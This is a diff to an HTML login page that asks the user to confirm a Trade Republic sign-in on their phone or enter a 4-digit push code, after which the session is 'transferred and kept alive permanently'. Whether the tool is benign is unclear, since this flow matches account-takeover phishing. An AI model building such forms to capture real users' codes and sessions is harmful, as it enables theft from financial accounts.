@@ -654,8 +654,8 @@
         <div class="alert alert-info">
           <b data-i18n="twofa_title">Approval Required:</b><br>
           <span data-i18n="twofa_step1">1. Open the Trade Republic app on your phone and tap Confirm.</span><br>
-          <span data-i18n="twofa_step2">2. Once approved on your phone, click 'Check In-App Approval' below.</span><br>
-          <span data-i18n="twofa_step3">3. Your session will be transferred and kept alive permanently.</span>
+          <span data-i18n="twofa_step2">2. If you received a 4-digit push code instead of an in-app prompt, enter it below.</span><br>
+          <span data-i18n="twofa_step3">3. Once confirmed, your session will be transferred and kept alive permanently.</span>
           <div
             style="margin-top:0.75rem;padding-top:0.5rem;border-top:1px solid rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:space-between;">
             <span data-i18n="twofa_timer" style="font-size:0.85rem;color:#cbd5e1;">Time remaining to confirm:</span>
@@ -663,7 +663,11 @@
               style="font-family:monospace;font-weight:700;font-size:1.1rem;color:#fbbf24;">02:00</span>
           </div>
         </div>
-        <button type="submit" style="background:#22c55e;" data-i18n="btn_check_2fa">✓ Check In-App Approval</button>
+        <div class="form-group" style="margin-top:1rem;">
+          <label for="code" data-i18n="lbl_2fa_code">4-Digit Push Code (Optional — only if received via notification)</label>
+          <input type="text" id="code" placeholder="1234" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" autocomplete="one-time-code" style="letter-spacing:0.3em;font-size:1.1rem;font-weight:700;text-align:center;" />
+        </div>
+        <button type="submit" style="background:#22c55e;" data-i18n="btn_check_2fa">✓ Confirm / Check Approval</button>
       </form>
     </div>
 
